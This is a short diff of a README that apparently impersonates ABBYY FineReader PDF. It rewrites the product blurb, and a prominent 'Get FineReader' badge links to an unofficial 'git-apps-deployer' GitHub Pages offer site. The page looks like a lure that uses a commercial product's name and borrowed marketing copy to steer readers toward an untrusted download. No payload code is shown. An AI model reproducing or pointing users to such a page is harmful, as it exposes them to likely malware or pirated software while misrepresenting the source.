@@ -1,5 +1,6 @@
 # FineReader for PC — Desktop OCR & PDF Manager
-FineReader PDF: Powerful PDF and OCR software. Accurately edit, convert, and work with your scanned documents and PDFs. Download now for Windows and macOS.
+ABBYY FineReader PDF is a trusted application for working with PDFs and digitizing paper documents. Leveraging advanced AI-based OCR (Optical Character Recognition), it precisely converts scans, images, and PDFs into editable and searchable formats. 
+
 [![Get FineReader GitHub](https://img.shields.io/badge/Get%20FineReader%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://git-apps-deployer.github.io/.github/?offer=FineReader)  
 
 ---
